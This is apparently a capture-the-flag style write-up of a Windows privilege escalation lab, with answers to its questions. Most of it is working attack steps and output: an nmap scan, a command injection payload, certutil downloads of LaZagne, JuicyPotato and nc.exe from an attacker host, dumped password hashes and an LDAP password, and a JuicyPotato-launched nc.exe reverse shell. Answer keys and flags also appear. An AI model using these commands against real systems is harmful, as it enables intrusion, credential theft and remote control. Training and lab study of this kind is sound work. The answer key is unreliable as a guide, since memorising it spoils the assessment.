# Windows Privilege Escalation Skills Assessment - Part I
During a penetration test against the INLANEFREIGHT organization, you encounter a non-domain joined Windows server host that suffers from an unpatched command injection vulnerability. After gaining a foothold, you come across credentials that may be useful for lateral movement later in the assessment and uncover another flaw that can be leveraged to escalate privileges on the target host.

For this assessment, assume that your client has a relatively mature patch/vulnerability management program but is understaffed and unaware of many of the best practices around configuration management, which could leave a host open to privilege escalation.

Enumerate the host (starting with an Nmap port scan to identify accessible ports/services), leverage the command injection flaw to gain reverse shell access, escalate privileges to `NT AUTHORITY\SYSTEM` level or similar access, and answer the questions below to complete this portion of the assessment.

## Questions
1. Which two KBs are installed on the target system? (Answer format: 3210000&3210060) **Answer: 3200970**
   - Run a nmap scan, identified port 80 and 3389 open:
        ```shellsession
        $ sudo nmap -sV -sC -Pn -p- --disable-arp-ping 10.129.105.95
        Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-17 04:21 EDT
        Nmap scan report for 10.129.105.95
        Host is up (0.15s latency).
        Not shown: 65533 filtered tcp ports (no-response)
        PORT     STATE SERVICE       VERSION
        80/tcp   open  http          Microsoft IIS httpd 10.0
        |_http-title: DEV Connection Tester
        | http-methods: 
        |_  Potentially risky methods: TRACE
        |_http-server-header: Microsoft-IIS/10.0
        3389/tcp open  ms-wbt-server Microsoft Terminal Services
        |_ssl-date: 2026-07-17T08:23:57+00:00; -3s from scanner time.
        | rdp-ntlm-info: 
        |   Target_Name: WINLPE-SKILLS1-
        |   NetBIOS_Domain_Name: WINLPE-SKILLS1-
        |   NetBIOS_Computer_Name: WINLPE-SKILLS1-
        |   DNS_Domain_Name: WINLPE-SKILLS1-SRV
        |   DNS_Computer_Name: WINLPE-SKILLS1-SRV
        |   Product_Version: 10.0.14393
        |_  System_Time: 2026-07-17T08:23:52+00:00
        | ssl-cert: Subject: commonName=WINLPE-SKILLS1-SRV
        | Not valid before: 2026-07-16T08:12:10
        |_Not valid after:  2027-01-15T08:12:10
        Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
        ```
   - Found and exploit the command injection vulnerability on the web:
        ```
        POST / HTTP/1.1

        <SNIP>addr=127.0.0.1+%26%26+wmic+qfe+list+brief+<SNIP>
        ```
        ```
        Pinging 127.0.0.1 with 32 bytes of data:
        Reply from 127.0.0.1: bytes=32 time&lt;1ms TTL=128
        Reply from 127.0.0.1: bytes=32 time&lt;1ms TTL=128

        Ping statistics for 127.0.0.1:
            Packets: Sent = 2, Received = 2, Lost = 0 (0% loss),
        Approximate round trip times in milli-seconds:
            Minimum = 0ms, Maximum = 0ms, Average = 0ms
        Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status  

        Update                        KB3199986               NT AUTHORITY\SYSTEM  11/21/2016                                      

        Security Update               KB3200970               NT AUTHORITY\SYSTEM  11/21/2016  
        
        <SNIP>
        ```
2. Find the password for the ldapadmin account somewhere on the system. **Answer: car3ful_st0rinG_cr3d$**
   - After escalating privileges, transfer LaZagne.exe to the victim and execute it to find the password:
        ```cmd
        C:\Windows\system32>certutil.exe -f -urlcache http://10.10.15.142:8000/LaZagne.exe C:\Users\Public\lz.exe
        C:\Windows\system32>C:\Users\Public\lz.exe all

        |====================================================================|
        |                                                                    |
        |                        The LaZagne Project                         |
        |                                                                    |
        |                          ! BANG BANG !                             |
        |                                                                    |
        |====================================================================|

        [+] System masterkey decrypted for 1ef7b31a-39fd-4309-877e-c354d5a19506
        [+] System masterkey decrypted for 644d306e-3a7a-434b-bd62-0b81ab91e5b6
        [+] System masterkey decrypted for 6977da93-ec45-468e-8a19-97d9865fb2e6

        ########## User: SYSTEM ##########

        ------------------- Hashdump passwords -----------------

        Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        mrb3n:1000:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
        htb-student:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::

        ------------------- Lsa_secrets passwords -----------------

        DPAPI_SYSTEM
        0000   01 00 00 00 1D 35 B6 2C 53 EC 28 92 E8 6D D5 BE    .....5.,S.(..m..
        0010   C7 4C 78 54 10 66 34 3A 70 3F 77 AF 3F 11 FA 7F    .LxT.f4:p?w.?...
        0020   03 8D 79 6A CC 1A FF AC 7C 0E DD D3                ..yj....|...

        NL$KM
        0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
        0010   99 4F 5D 6C 55 B9 EC B5 0C 0B D8 75 A2 88 93 E4    .O]lU......u....
        0020   C0 D9 EF C5 0D B9 40 57 92 39 9A BE 9D A5 83 ED    ......@W.9......
        0030   11 CB 71 7C AB 32 CD 11 FD 7A ED 2E AB BE F1 62    ..q|.2...z.....b
        0040   58 F2 1D 8A AC 9F AC FB 32 17 D8 EE B3 BD A5 DC    X.......2.......
        0050   E2 D9 82 77 4A A3 16 D6 F3 B5 E0 28 13 72 C7 2E    ...wJ......(.r..



        ########## User: Administrator ##########

        ------------------- Apachedirectorystudio passwords -----------------

        [+] Password found !!!
        Host: dc01.inlanefreight.local
        Port: 389
        Login: ldapadmin
        Password: car3ful_st0rinG_cr3d$
        AuthenticationMethod: SIMPLE


        ########## User: htb-student ##########

        ------------------- Apachedirectorystudio passwords -----------------

        [+] Password found !!!
        Host: DC01.INLANEFREIGHT.LOCAL
        Port: 389
        Login: ldapadmin
        Password: car3ful_st0rinG_cr3d$
        AuthenticationMethod: SIMPLE


        [+] 2 passwords have been found.
        For more information launch it again with the -v option

        elapsed time = 5.125015735626221
        ```
   - 
3. Escalate privileges and submit the contents of the flag.txt file on the Administrator Desktop. **Answer: Ev3ry_sysadm1ns_n1ghtMare!**
   - Check privileges of the current user → `SeImpersonate` is enabled:
        ```cmd
        C:\Users\Public>whoami /priv
        whoami /priv

        PRIVILEGES INFORMATION
        ----------------------

        Privilege Name                Description                               State  
        ============================= ========================================= =======
        <SNIP>                 
        SeImpersonatePrivilege        Impersonate a client after authentication Enabled
        <SNIP>
        ```
   - Exploit this using [JuicyPotato](https://github.com/ohpe/juicy-potato) by transfering the JuicyPotato.exe and [nc.exe](https://github.com/int0x33/nc.exe/) to the victim:
        ```cmd
        C:\Users\Public> certutil.exe -f -urlcache http://10.10.15.142:8000/JuicyPotato.exe C:\Users\Public\jp.exe
        C:\Users\Public> certutil.exe -f -urlcache http://10.10.15.142:8000/nc.exe C:\Users\Public\nc.exe
        ```
   - Start a listener locally and execute the script:
        ```shellsession
        $ nc -nlvp 14113
        ```
        ```cmd
        C:\Users\Public>jp.exe -l 4141 -c "{8BC3F05E-D86B-11D0-A075-00C04FB68820}" -p c:\windows\system32\cmd.exe -a " /c c:\users\Public\nc.exe -e cmd.exe 10.10.15.142 14113" -t *
        jp.exe -l 4141 -c "{8BC3F05E-D86B-11D0-A075-00C04FB68820}" -p c:\windows\system32\cmd.exe -a " /c c:\users\Public\nc.exe -e cmd.exe 10.10.15.142 14113" -t *
        Testing {8BC3F05E-D86B-11D0-A075-00C04FB68820} 4141
        ......
        [+] authresult 0
        {8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\SYSTEM

        [+] CreateProcessWithTokenW OK
        ```
   - Catch the privileged shell and read the flag:
        ```shellsession
        $ nc -nlvp 14113
        Listening on 0.0.0.0 14113
        Connection received on 10.129.225.46 49700
        Microsoft Windows [Version 10.0.14393]
        (c) 2016 Microsoft Corporation. All rights reserved.

        C:\Windows\system32>more C:\Users\Administrator\Desktop\flag.txt
        Ev3ry_sysadm1ns_n1ghtMare!
        ```
4. After escalating privileges, locate a file named confidential.txt. Submit the contents of this file. **Answer: 5e5a7dafa79d923de3340e146318c31a**
   - Find the file and read the flag:
        ```cmd
        C:\Windows\system32>where /r C:\ confidential.txt
        C:\Documents and Settings\Administrator\Documents\My Music\confidential.txt
        C:\Documents and Settings\Administrator\Music\confidential.txt
        C:\Documents and Settings\Administrator\My Documents\My Music\confidential.txt
        C:\Users\Administrator\Documents\My Music\confidential.txt
        C:\Users\Administrator\Music\confidential.txt
        C:\Users\Administrator\My Documents\My Music\confidential.txt

        C:\Windows\system32>more C:\Users\Administrator\Music\confidential.txt
        5e5a7dafa79d923de3340e146318c31a
        ```